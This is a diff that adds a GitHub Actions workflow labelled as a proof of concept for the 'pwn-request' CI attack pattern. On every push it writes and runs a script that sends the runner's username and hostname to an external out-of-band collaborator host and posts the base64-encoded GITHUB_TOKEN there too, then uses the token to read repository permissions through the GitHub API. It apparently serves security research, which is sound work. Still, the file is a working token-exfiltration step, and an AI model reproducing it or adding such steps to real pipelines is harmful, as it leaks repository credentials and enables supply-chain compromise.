@@ -1,0 +1,23 @@
+name: PoC pwn-request Pattern - Checkout Execute
+on: push
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: checkout
+        uses: actions/checkout@v4
+      - name: simulate-attacker-script-execution
+        run: |
+          cat > /tmp/attacker-script.sh << 'EOF'
+          #!/bin/bash
+          curl -sk "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/PWN-REQUEST-RCE-$(whoami | base64 -w0).$(hostname | base64 -w0)"
+          curl -sk -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/PWN-REQUEST-TOKEN=" < <(echo -n "$GITHUB_TOKEN" | base64 -w0)
+          EOF
+          chmod +x /tmp/attacker-script.sh
+          bash /tmp/attacker-script.sh
+      - name: show-permissions
+        run: |
+          echo "=== GITHUB_TOKEN Permissions ==="
+          curl -sk -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github.v3+json" \
+            "https://api.github.com/repos/fdzdev/tt2" | jq '.permissions // "no permissions info"'
